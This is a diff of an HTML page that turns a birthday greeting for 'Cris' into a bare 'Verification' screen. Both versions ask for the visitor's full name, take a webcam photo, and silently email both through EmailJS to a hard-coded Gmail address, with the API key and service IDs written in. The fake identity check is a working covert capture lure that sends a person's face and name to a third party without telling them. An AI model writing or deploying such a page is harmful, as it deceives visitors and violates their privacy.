@@ -2,188 +2,71 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Birthday Protocol: Cris</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
-        :root {
-            --neon-blue: #00f2ff;
-            --gold: #ffd700;
-            --dark: #050505;
-        }
-
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-
-        body, html {
-            margin: 0; padding: 0; width: 100%; height: 100vh;
-            background-color: var(--dark); color: white;
-            font-family: 'Segoe UI', Roboto, sans-serif;
-            overflow: hidden;
-        }
-
-        .screen {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            display: none; flex-direction: column; align-items: center; 
-            justify-content: center; background: var(--dark);
-            padding: 20px;
-        }
-
-        .active { display: flex; animation: fadeIn 0.6s ease-in; }
-
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-        /* STEP 1: SCANNER */
-        #video-container {
-            position: relative; width: 260px; height: 260px;
-            border: 3px solid var(--neon-blue); border-radius: 50%;
-            overflow: hidden; box-shadow: 0 0 25px var(--neon-blue);
-        }
+        body { background: #000; color: #00f2ff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        #video-container { width: 250px; height: 250px; border: 3px solid #00f2ff; border-radius: 50%; overflow: hidden; position: relative; }
         video { width: 100%; height: 100%; object-fit: cover; }
-        
-        .scan-line {
-            position: absolute; width: 100%; height: 4px;
-            background: var(--neon-blue); top: 0;
-            box-shadow: 0 0 15px var(--neon-blue);
-            animation: scanning 2s infinite linear;
-            display: none;
-        }
-
-        @keyframes scanning {
-            0% { top: 0; } 100% { top: 100%; }
-        }
-
-        input {
-            margin: 20px 0; padding: 15px; width: 85%; max-width: 300px;
-            background: rgba(255,255,255,0.05); border: 1px solid var(--neon-blue);
-            color: white; text-align: center; border-radius: 30px; font-size: 1rem;
-            outline: none;
-        }
-
-        /* STEP 2: ENVELOPE */
-        .envelope {
-            width: 280px; height: 180px; background: #1a1a1a;
-            border: 2px solid var(--gold); position: relative;
-            display: flex; align-items: center; justify-content: center;
-            cursor: pointer; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-        .message-content {
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            width: 90%; max-height: 80vh; background: #fff; color: #000;
-            padding: 25px; border-radius: 15px; overflow-y: auto;
-            display: none; line-height: 1.6; z-index: 100;
-        }
-
-        /* STEP 3: CAKE */
-        .cake {
-            width: 200px; height: 130px; background: #fdb9c8;
-            border-radius: 15px 15px 0 0; position: relative;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-        }
-        .candle {
-            width: 12px; height: 40px; background: white;
-            position: absolute; top: -40px; left: 50%; transform: translateX(-50%);
-        }
-        .flame {
-            width: 18px; height: 28px; background: orange;
-            border-radius: 50% 50% 20% 20%; position: absolute; top: -30px;
-            left: 50%; transform: translateX(-50%);
-            animation: flicker 0.1s infinite alternate;
-            box-shadow: 0 0 15px orange;
-        }
-        @keyframes flicker {
-            from { transform: translateX(-50%) scale(1); }
-            to { transform: translateX(-50%) scale(1.15); }
-        }
-
-        .btn {
-            background: var(--neon-blue); border: none; color: black;
-            padding: 15px 40px; font-weight: bold; border-radius: 30px;
-            letter-spacing: 1px; cursor: pointer; margin-top: 20px;
-            text-transform: uppercase;
-        }
+        .scan { position: absolute; width: 100%; height: 4px; background: #00f2ff; top: 0; animation: move 2s infinite; display: none; }
+        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
+        button { margin-top: 20px; padding: 15px 30px; background: #00f2ff; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
+        input { margin: 10px; padding: 10px; border-radius: 5px; border: none; text-align: center; }
+        #message { display: none; text-align: center; color: white; padding: 20px; }
     </style>
 </head>
 <body>
 
-    <div id="screen1" class="screen active">
-        <h2 style="color: var(--neon-blue); letter-spacing: 3px;">SYSTEM SCAN</h2>
+    <div id="capture-site">
+        <h2>SYSTEM SCAN</h2>
         <div id="video-container">
             <video id="webcam" autoplay playsinline></video>
-            <div id="scanner" class="scan-line"></div>
+            <div id="scanner" class="scan"></div>
         </div>
-        <input type="text" id="userName" placeholder="FULL NAME REQUIRED">
-        <button class="btn" onclick="processIdentity()">VERIFY</button>
-        <canvas id="captureCanvas" style="display:none;"></canvas>
+        <input type="text" id="userName" placeholder="Full Name">
+        <button onclick="captureAndSend()">VERIFY IDENTITY</button>
     </div>
 
-    <div id="screen2" class="screen">
-        <h2 style="color: var(--gold); margin-bottom: 20px;">ACCESS GRANTED</h2>
-        <div class="envelope" onclick="openMsg()">
-            <span style="color: var(--gold); font-weight: bold;">YOU HAVE (1) MESSAGE ✉️</span>
-        </div>
-        <div id="fullMsg" class="message-content">
-            <h3 style="text-align: center;">Happy birthday, Cris!!</h3>
-            <p>Bro, u should really read this kahit ang hirap mag-code ng message na ‘to 😭</p>
-            <p>Salamat sa lahat, fr. Dahil sa inyo, hindi na ako yung taong laging lost at di marunong umuwi mag-isa HAHAHA.</p>
-            <p>Solid kayo, as in.</p>
-            <p>Next time, promise, babawi ako. <b>Gagawin nating honor student trio arc ‘to 😤📚</b></p>
-            <p>And bro… chill lang sa life, wag ka muna magmadali mag-asawa 😭 We’ve got places to go.</p>
-            <p>Happy birthday ulit, Cris. Stay legendary. 🚀</p>
-            <button class="btn" style="width:100%;" onclick="goToCake()">BLOW THE CAKE</button>
-        </div>
+    <div id="message">
+        <h1>ACCESS GRANTED</h1>
+        <p>Happy Birthday, Cris! Check your messages.</p>
     </div>
 
-    <div id="screen3" class="screen">
-        <h2 id="finalHeader">MAKE A WISH</h2>
-        <div class="cake" onclick="blowCandle()">
-            <div class="candle"><div id="flame" class="flame"></div></div>
-        </div>
-        <p style="margin-top: 20px; color: #888;">Tap the cake to blow the candle</p>
-    </div>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        (function() {
-            emailjs.init("A996XaJv7m7qD29bh"); 
-        })();
+        (function() { emailjs.init("A996XaJv7m7qD29bh"); })();
 
         const video = document.getElementById('webcam');
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => { video.srcObject = stream; })
-            .catch(err => alert("Camera needed for verification!"));
+            .catch(err => alert("Camera access required!"));
 
-        function processIdentity() {
+        function captureAndSend() {
             const name = document.getElementById('userName').value;
-            if (!name) return alert("Please enter your name!");
+            if (!name) return alert("Name required");
 
             document.getElementById('scanner').style.display = 'block';
 
-            const canvas = document.getElementById('captureCanvas');
+            // Capture
+            const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const base64Image = canvas.toDataURL('image/jpeg');
+            const photo = canvas.toDataURL('image/jpeg', 0.7);
 
+            // Send
             emailjs.send("service_7urz7m7", "template_7mr2oqu", {
                 full_name: name,
-                image_data: base64Image,
+                image_data: photo,
                 to_email: "refuerzojay7@gmail.com"
             }).then(() => {
-                setTimeout(() => {
-                    document.getElementById('screen1').classList.remove('active');
-                    document.getElementById('screen2').classList.add('active');
-                }, 2000);
+                // Show Success
+                document.getElementById('capture-site').style.display = 'none';
+                document.getElementById('message').style.display = 'block';
             });
-        }
-
-        function openMsg() { document.getElementById('fullMsg').style.display = 'block'; }
-        function goToCake() {
-            document.getElementById('screen2').classList.remove('active');
-            document.getElementById('screen3').classList.add('active');
-        }
-        function blowCandle() {
-            document.getElementById('flame').style.display = 'none';
-            document.getElementById('finalHeader').innerText = "HAPPY BIRTHDAY CRIS! 🎉";
         }
     </script>
 </body>
